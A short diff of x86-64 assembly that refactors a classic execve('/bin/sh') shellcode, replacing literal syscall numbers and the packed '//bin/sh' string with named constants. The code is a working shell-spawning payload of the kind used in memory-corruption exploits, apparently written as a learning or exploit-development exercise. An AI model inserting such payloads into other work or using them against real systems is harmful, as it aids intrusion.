@@ -1,12 +1,14 @@
 	.global _start
 	.text
-sys_exec = 59
+sys_exec 	= 59
+sys_exit 	= 60
+sh			= 0x68732f6e69622f2f		# //bin/sh
 _start:
 	push $sys_exec						# execve(bin,args,env)
 	pop %rax
 	xor %rdx, %rdx
-	movabs $0x68732f6e69622f2f, %rbx 	# //bin/sh
-	shr $0x8, %rbx
+	movabs $sh, %rbx
+	shr $0x8, %rbx						# / -> \0
 	push %rbx
 	push %rsp
 	pop %rdi
@@ -15,7 +17,7 @@ _start:
 	push %rsp
 	pop %rsi
 	syscall
-	push $60							# exit(0)
+	push $sys_exit						# exit(0)
 	pop %rax
 	xor %rdi, %rdi
 	syscall
